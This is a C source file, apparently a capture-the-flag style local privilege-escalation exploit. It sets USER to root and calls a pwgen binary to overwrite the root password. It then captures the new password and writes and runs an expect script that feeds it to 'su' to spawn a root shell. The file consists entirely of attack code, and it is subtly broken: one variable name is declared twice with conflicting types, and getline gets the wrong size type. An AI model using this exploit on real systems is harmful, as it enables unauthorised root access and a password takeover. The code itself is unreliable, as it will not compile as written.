#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char const *argv[]) {
    char *line = NULL;
    char *pass = NULL;
    int size = 38;
    FILE *script;
    FILE *pass;

    pass = malloc(sizeof(char)*7);
    setenv("USER","root",1);

    // Generate password and override the current user password
    // Write the password from stdout to file
    system("/usr/local/bin/pwgen -w > pass");
    pass = fopen("pass","r");

    // Read first line from file
    getline(&line,&size,pass);
    // Get the password by removing the "Generated password (length 6):" part
    strncpy(pass, line+31, 6);

    script = fopen("script","w");

    fprintf(script, "#!/usr/bin/expect\n");
    fprintf(script, "spawn su -c /bin/sh\n");
    fprintf(script, "expect \"Password: \"\n");
    fprintf(script, "send ");
    fprintf(script, "\"");
    fprintf(script, "%s", pass);
    fprintf(script, "\\r");
    fprintf(script, "\"");
    fprintf(script, "\n");
    fprintf(script, "interact\n");
    fclose(script);
    system("rm pass");
    system("expect script");
    exit(0);
}